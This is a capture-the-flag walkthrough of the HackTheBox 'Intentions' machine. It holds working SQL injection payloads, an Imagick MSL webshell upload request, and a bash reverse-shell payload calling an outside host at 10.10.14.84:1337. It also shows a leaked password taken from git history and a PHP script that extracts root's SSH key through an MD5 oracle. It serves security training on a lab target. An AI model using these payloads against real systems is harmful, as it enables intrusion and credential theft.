# [HackTheBox Write-Up: Intentions] - [Hard]

#### Preparation phase:
We are given the following IP address -> **10.10.11.220**

First, we start by adding machine's IP to the hosts file and give it it's \[name + .htb\]:
```zsh
sudo echo "10.10.11.220    intentions.htb" >> /etc/hosts
```

Create a directory for enumeration:
```
mkdir enumeration
```

#### Enumeration phase: 
- NMAP
```
# -sC for default script
# -sV for version detection on open ports
# -oN save output to file in normal format
# -v for verbosity
nmap -sC -sV -v intentions.htb -oN enumeration/nmap

Nmap scan report for intentions.htb (10.10.11.220)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Intentions
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Not much to see above. NGINX on 80 and SSH on 22. 

We ran **nmap** once again to scan full range of ports, but there was nothing more
```
nmap -sC -sV -v intentions.htb -oN enumeration/scan-full -p-
```

We also ran a **gobuster** to discover directories: 
```
# t - running with 50 threads
# w - passing a wordlist of a well known directories
# o - output to file
gobuster dir -u http://intentions.htb/ -t 50 -w $wordlists/content/dirs-medium.txt -o enumeration/gobuster
```

### Port 80
![](<../../../assets/htb/Screenshot 2023-07-11 at 14.53.37.png>)

![](<../../../assets/htb/Screenshot 2023-07-11 at 15.24.16.png>)

- By looking at response headers(*XSRF-TOKEN*, *intentions_session*), we instantly guessed the framework behind this website, which is most likely to be **PHP Laravel**.
- We were inattentive enough and missed one small detail in the html source code above. Later, we will spend hours to find out it was on very surface, but let's continue with how our thoughts were going at the moment.

We started looking for publicly known **Laravel** vulnerabilities and trying all available POC's out, but nothing seemed to work. In the meantime, we were also going through the process of registration and login, provided on the main page.

After creating profile with **username: admin** and **password: admin** and logging in, we've been provided with some kind of dashboard: 
(*same dashboard you will see no matter what login you choose)*
![](<../../../assets/htb/main-app-fe.gif>)

![](<../../../assets/htb/Screenshot 2023-07-11 at 16.05.59.png>)

We saw **admin: 0** in the API /auth/user response and immediately tried some **[mass assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)** tricks but nothing worked. One thing that we know for sure at the moment, is that there could be admin users somewhere.

This particular page was the most interesting as it is accepting user input and **Favorite Genres** feature was screaming at us with its label "New" and the comment saying it's indeed a new feature. When you see this kind of thing, it's most likely to be vulnerable, because developer is trying to say here: *i've deployed this to prod, but haven't enough time to test it yet..*
![](<../../../assets/htb/Screenshot 2023-07-11 at 16.13.34.png>)

---
##### Let's explore it!
> food, travel, nature - are 3 different genres and the question is: what do these genres affect in the app?

After tinkering here and there, we found that **feed** endpoint returns a list of objects representing an image and some other properties, including **genre**.
![](<../../../assets/htb/Screenshot 2023-07-11 at 16.20.41.png>)

While playing with genres, we observed that **Your Feed** page doesn't display anything, when we change genre to something that does not exists:
![](<../../../assets/htb/feed-update.gif>)
confirming from burp suite:
![](<../../../assets/htb/Screenshot 2023-07-11 at 16.27.53.png>)
data for feeds page is indeed empty:
![](<../../../assets/htb/Screenshot 2023-07-11 at 16.28.13.png>)

----
#### Finding an SQL injection vulnerability and exploiting it
We tried injecting a single quote to genres and got **500** error code in response to `/api/v1/gallery/user/feed` endpoint:
![](<../../../assets/htb/Screenshot 2023-07-11 at 16.30.53.png>)

So far, so good. Let's confirm if we have an SQL injection vulnerability here:
![](<../../../assets/htb/Screenshot 2023-07-11 at 16.32.26.png>)
but in response we got 500 again and again and again, until we decided to figure out what type of query is there we're trying to break out of. After some experiments, we came to conclusion, that the original query was something similar to:
```SQL
"SELECT * FROM images WHERE genre IN ('food', 'travel', 'nature')"
```

Knowing this, we tried our sql injection payload:
```
{
	"genres": "bananas') OR 1=1#"
}
```

Aaand it failed. ![](<../../../assets/htb/Screenshot 2023-07-13 at 15.01.08.png>)

We spend nearly an hour here, trying to figure out why injection is not working until we realized it's all about spaces.. So we tried /\*\*/ instead of spacec and everything worked well finally.

**Using a binary search algorithm with the ORDER BY clause to determine the number of columns:**
- `{"genres":"')/**/ORDER/**/BY/**/10#"}` -> error
- `{"genres":"')/**/ORDER/**/BY/**/1#"}` -> ok
- `{"genres":"')/**/ORDER/**/BY/**/5#"}` -> ok
- `{"genres":"')/**/ORDER/**/BY/**/7#"}` -> error
- `{"genres":"')/**/ORDER/**/BY/**/6#"}` -> error

**Now that we know the count is 5, we can proceed with the UNION SELECT clause:**
```json
{
	"genres":"')/**/UNION/**/SELECT/**/1,2,3,4,5#"
}
```
![](<../../../assets/htb/Screenshot 2023-07-13 at 15.23.12.png>)

We'll utilize the "file" option, which yields the value "2", as our data exfiltration point.
Knowing Laravel's database structure, let's pull admin email and password!
![](<../../../assets/htb/Screenshot 2023-07-13 at 15.32.02.png>)

Result:
![](<../../../assets/htb/Screenshot 2023-07-13 at 15.32.51.png>)

At this juncture, we had successfully obtained two admins email addresses along with their bcrypt hashed passwords. However, we hadn't yet perused the HackTheBox FAQ page. Unaware of the guideline stating that any discovered hash should take a maximum of 5 minutes to crack with a rockyou.txt wordlist, we embarked on a more arduous journey. We fired up a quad RTX 4060 machine and brute-forced our way through approximately 85 million passwords.

Feeling uncertain about our approach, we decided to consult the machine's Discord channel. That's when we were enlightened about the 5-minute rule. Despite it being almost 7 in the morning, our spirits were undeterred. We were determined to claim at least a user flag before surrendering to sleep. The adventure continues!

---
#### Back to recon, recon, recon 🔬

Let's see what's in the **gobuster** output once more:
```
/gallery              (Status: 302) [Size: 330] /gallery/
/admin                (Status: 302) [Size: 330] /admin/
/storage              (Status: 301) [Size: 178] /storage/
/css                  (Status: 301) [Size: 178] /css/
/js                   (Status: 301) [Size: 178] /js/
/logout               (Status: 302) [Size: 330] /logout/
```

Admin directory is our target. When opening it directly, we get redirected back to login. We don't have admin passwords, only hashes.. What can we do?

Remember I said in the beginning that we missed something pretty obvious? It's time to look closer once more: Can you spot anything interesting here? 
![](<../../../assets/htb/Screenshot 2023-07-13 at 19.47.21.png>)

- /js/login.js
- /js/mdb.js

Our search in those JavaScript files proved fruitless, but could there be other JavaScript files lurking in the shadows? The answer is a resounding yes! We had a potential lead - the `/admin` page. Surely, it must be accompanied by some JavaScript, right? With a spark of inspiration, we tried `/js/admin.js`. Lo and behold, it worked! Our persistence had paid off.

After going through its content, we revealed some new endpoints and a hardcoded text:
![](<../../../assets/htb/Screenshot 2023-07-13 at 20.01.40.png>)

>Recently we've had some copyrighted images slip through onto the gallery. 
>This could turn into a big issue for us so we are putting a new process in place that all new images must go through our legal council for approval.
>Any new images you would like to add to the gallery should be provided to legal with all relevant copyright information.
>I've assigned Greg to setup a process for legal to transfer approved images directly to the server to avoid any confusion or mishaps.
>This will be the only way to add images to our gallery going forward.
---
>Hey team, I've deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs. 
>This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.
>This should take care of the concerns raised by our users regarding our lack of HTTPS connection.
>
>The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: [Image Feature Reference](https://www.php.net/manual/en/class.imagick.php)
---

First comment doesn't make sense yet, but the second one makes it crystal clear: 
- we should use hashed passwords to login to admin area by utilizing the v2 API

We went through the login flow, but replaced v1 to v2 in the url:
![](<../../../assets/htb/Screenshot 2023-07-13 at 20.12.16.png>)
Says hash field is required! No problem at all.
![](<../../../assets/htb/Screenshot 2023-07-13 at 20.12.52.png>)

Finally we've been able to login to admin panel
![](<../../../assets/htb/admin-panel.gif>)

---
#### Discovering and Exploiting the RCE Vulnerability

Recall the brief we encountered earlier:
> "The v2 API also introduces some exciting new features currently under testing that could allow users to apply interesting effects to images. We've provided a few examples on the image editing page, but feel free to explore all of the available effects for the module and make suggestions: [Image Feature Reference](https://www.php.net/manual/en/class.imagick.php)"

The hint pointed us to the Imagick PHP library, which powers the image manipulation feature. The `/api/v2/admin/image/modify` endpoint accepts a JSON body like this:
```json
{
	"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg", 	
	"effect":"charcoal"
}
```

We embarked on a comprehensive testing spree, employing the following strategies:

- Fuzzing both the `path` and `effect` parameters.
- Attempting nearly all known ImageMagick exploit vectors found online.
- Applying SSRF techniques to exploit gopher-based Redis, Memcache, or MySQL attacks - but neither Redis nor Memcache were running on this installation, and MySQL was protected by a localhost password.

The results were underwhelming, so we moved on to explore other avenues.

#### Enter MSL - Magick Scripting Language

According to the official documentation:

> The `conjure` program enables you to perform custom image processing tasks using a script written in the Magick Scripting Language (MSL). MSL is XML-based and consists of action statements with attributes. Actions can include reading an image, processing an image, obtaining attributes from an image, writing an image, and more. An attribute is a key/value pair that alters the behavior of an action.

Our research led us to an insightful [article](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) by PTsecurity researcher [Arseniy Sharoglazov](https://swarm.ptsecurity.com/author/arseniy-sharoglazov/). The article details how to exploit PHP's built-in classes to achieve RCE via an arbitrary object instantiation bug, where one can control both the classname and its argument during instantiation:
```php
$obj = new $controlled($input);
```

The author demonstrated the effectiveness of this technique using the `Imagick` class. This approach appeared promising, given our setup:
```php
$im = new Imagick($path);
```

To summarize, here are the core components we utilized from Sharoglazov's article:

- We crafted an MSL script to fetch a PHP payload from our host:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://attacker.com/payload.png" />
  <write filename="/var/www/html/intentions/public/webshell.php" />
</image>
```
However, URLs like `msl:http://attacker.com` aren't supported, so we had to upload our MSL script to the target machine and include it from there:
```json
{
	"path":"msl:/tmp/payload.msl",
	"effect":"xxx"
}
```

The plan was to send a `multipart/form-data` request with our MSL script as a file. PHP would then create a temporary file in `/tmp/phpXXXXXX` that we could include in the same request, using a technique Sharoglazov discovered:
- The `vid:` scheme allowed for wildcard usage in the path, enabling us to use `vid:msl:/tmp/php*`

To make this work, we first needed to embed a PHP payload within an image. If we didn't, retrieving the payload from our server would fail:
```bash
convert xc:red -set 'Copyright' '<?php system("bash -i >& /dev/tcp/10.10.14.84/1337 0>&1"); ?>' payload.png
```

Next, we had to package all of this into a single request. Luckily, we could relocate the `path` and `effect` parameters from the JSON body to the query string and submit a single multipart request:
```http
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=xxx HTTP/1.1
Host: intentions.htb
Content-Type: multipart/form-data; boundary=-----------------------------boundary1234567890
Content-Length: ...
Connection: close
 
-----------------------------boundary1234567890
Content-Disposition: form-data; name="payload"; filename="payload.msl";
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="http://10.10.14.84/payload.png" />
 <write filename="/var/www/html/intentions/public/payload.php" />
</image>
-----------------------------boundary1234567890
```
>Finding the right location for the webshell proved to be tricky and required a fair bit of trial and error. But eventually, we discovered that `/public/` worked, and we could access our payload at: http://intentions.htb/payload.php

##### Gettin a reverse shell
On local machine:
```bash
$ nc -l 1337
```

On remote host
```http
GET /payload.php HTTP/1.1
Host: intentions.htb
```

And we get a shell as **www-data**
```bash
www-data@intentions:/var/www/html/intentions$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Listing current directory and we can see .git
```
www-data@intentions:/var/www/html/intentions$ ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2 17:55 .
drwxr-xr-x   3 root     root       4096 Feb  2 17:55 ..
-rw-r--r--   1 root     root       1068 Feb  2 17:38 .env
drwxr-xr-x   8 root     root       4096 Feb  3 00:51 .git
-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
-rw-r--r--   1 root     root       1815 Jan 29 19:58 composer.json
-rw-r--r--   1 root     root     300400 Jan 29 19:58 composer.lock
drwxr-xr-x   2 root     root       4096 Jan 29 19:26 config
drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
-rw-r--r--   1 root     root       1629 Jan 29 20:17 docker-compose.yml
drwxr-xr-x 534 root     root      20480 Jan 30 23:38 node_modules
-rw-r--r--   1 root     root     420902 Jan 30 23:38 package-lock.json
-rw-r--r--   1 root     root        891 Jan 30 23:38 package.json
-rw-r--r--   1 root     root       1139 Jan 29 19:15 phpunit.xml
drwxr-xr-x   5 www-data www-data   4096 Feb  3 00:54 public
drwxr-xr-x   7 root     root       4096 Jan 29 19:58 resources
drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes
-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage
drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
drwxr-xr-x  45 root     root       4096 Jan 29 19:58 vendor
-rw-r--r--   1 root     root        722 Feb  2 17:46 webpack.mix.js
```

We downloaded that git repo to local machine, extracted it's content and read through all 4 commit messages. 
4/4 commit message says:
```
tree 5a19e7744f2e39cc72843304040e2b02d9e7ebea
parent 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
author greg <greg@intentions.htb> 1674721312 +0100
committer vgo0 <perpetualdisonnance@protonmail.ch> 1675356941 -0500

Test cases did not work on steve's local database, switching to user factory per his advice
```
>This message indicates, that commit 3/4 has something interesting, probably gregs password or something. 

Turned out, yes. It does. Here is content of **./tests/Feature/Helper.php** in the previous commit:
```php
<?php
namespace Tests\Feature;
use Tests\TestCase;
use App\Models\User;
use Auth;

class Helper extends TestCase {
	public static function getToken($test, $admin = false) {
		if($admin) {
			$res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);	
			return $res->headers->get('Authorization');
		} else {
	
			$res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
			return $res->headers->get('Authorization');
		}
	}
}
```

Trying this new password for user greg on the machine:
```bash
www-data@intentions:/var/www/html/intentions$ su greg
Password:
$ pwd
/var/www/html/intentions
$ bash
greg@intentions:/var/www/html/intentions$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
```

Reading flag:
```
greg@intentions:/var/www/html/intentions$ cd
greg@intentions:~$ cat user.txt
c9a15********************87185
```
---

### Privilege Escalation to ROOT

First things first, let's see if greg has some privs:
```bash
greg@intentions:~$ sudo -l
[sudo] password for greg:
Sorry, user greg may not run sudo on intentions.
```

Nothing, but we can see there are 2 interesting files in the gregs home dir:
`dmca_check.sh` and `dmca_hashes.test`
```bash
greg@intentions:~$ ls -la
total 52
drwxr-x--- 4 greg greg  4096 Jun 19 13:09 .
drwxr-xr-x 5 root root  4096 Jun 10 14:56 ..
lrwxrwxrwx 1 root root     9 Jun 19 13:09 .bash_history -> /dev/null
-rw-r--r-- 1 greg greg   220 Feb  2 18:10 .bash_logout
-rw-r--r-- 1 greg greg  3771 Feb  2 18:10 .bashrc
drwx------ 2 greg greg  4096 Jun 10 15:18 .cache
-rwxr-x--- 1 root greg    75 Jun 10 17:33 dmca_check.sh
-rwxr----- 1 root greg 11044 Jun 10 15:31 dmca_hashes.test
drwxrwxr-x 3 greg greg  4096 Jun 10 15:26 .local
-rw-r--r-- 1 greg greg   807 Feb  2 18:10 .profile
-rw-r----- 1 root greg    33 Jul 20 08:48 user.txt
-rw-r--r-- 1 greg greg    39 Jun 14 10:18 .vimrc
```

Contents of the `dmca_check.sh`
```bash
greg@intentions:~$ cat dmca_check.sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
```

What is scanner? Let's see:
```bash
greg@intentions:~$ file /opt/scanner/scanner
/opt/scanner/scanner: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=a7sTitVjvr1qc4Ngg3jt/LY6QPsAiDYUOHaK7gUXN/5aWVPmSwER6KHrDxGzr4/SUP48whD2UTLJ-Q2kLmf, stripped
```

Let's execute:
```
greg@intentions:~$ /opt/scanner/scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

	This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
	This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
	File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

	The hash blacklist file should be maintained as a single LABEL:MD5 per line.
	Please avoid using extra colons in the label as that is not currently supported.

	Expected output:
	1. Empty if no matches found
	2. A line for every match, example:
		[+] {LABEL} matches {FILE}

  -c string
    	Path to image file to check. Cannot be combined with -d
  -d string
    	Path to image directory to check. Cannot be combined with -c
  -h string
    	Path to colon separated hash file. Not compatible with -p
  -l int
    	Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p	[Debug] Print calculated file hash. Only compatible with -c
  -s string
    	Specific hash to check against. Not compatible with -h
```

At this point we learned:
1. This executable can access any file as root
2. We can exploit this functionality to brute root flag char by char
3. We want root first, not the flag

So, let's break down how we approached this challenge:
- Begin a loop that continues until the constructed key reaches a length of 3000 characters
- Increase the expected length of the key by 1.
- Use the scanner tool to compute an MD5 hash for the first `i` characters of roots private key
- Parse the output from the scanner tool to retrieve the computed hash
- Brute force the next character of the key by trying all possible ASCII characters (0-127) appended to the current key string and calculating the MD5 hash of the resulting string. When the hash of a tried string matches the hash from the scanner tool, the appended character is considered the next character of the key.
- Add the discovered character to the key string and print it.

Fast coding be like:
```php
<?php

$id_rsa = "-----BEGIN OPENSSH PRIVATE KEY-----";
$i = strlen($id_rsa);
echo $id_rsa;

while (true) {
	$i++;
	$result = exec("/opt/scanner/scanner -l ${i} -s 123456 -c /root/.ssh/id_rsa -p");
	$arr = explode(" ", $result);
	$hash = end($arr);
	$chr = brute($id_rsa, $hash);
	$id_rsa.= $chr;
	
	echo $chr;
	
	if ($i == 3000) break;
}

function brute($id_rsa, $hash) {
	for ($ascii = 0; $ascii <= 127; $ascii++) {
		$c = chr($ascii);
		if (md5($id_rsa . $c) === $hash) return $c;
	}
}
?>
```

We ran the script and got roots id_rsa:
```bash
greg@intentions:~/.local/share$ php privesc.php
```

Output:

![](<../../../assets/htb/get-root-id-rsa.gif>)

Login as root and read final flag:
```bash
greg@intentions:~/.local/share$ php privesc.php > id_rsa
greg@intentions:~/.local/share$ chmod 600 id_rsa
greg@intentions:~/.local/share$ ssh -i id_rsa root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:oM16qkT2127RdM/9i3UFwVNtt09fF4E6c4zhrHtGjw0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

root@intentions:~# cat root.txt
c0bb************************72c3
```
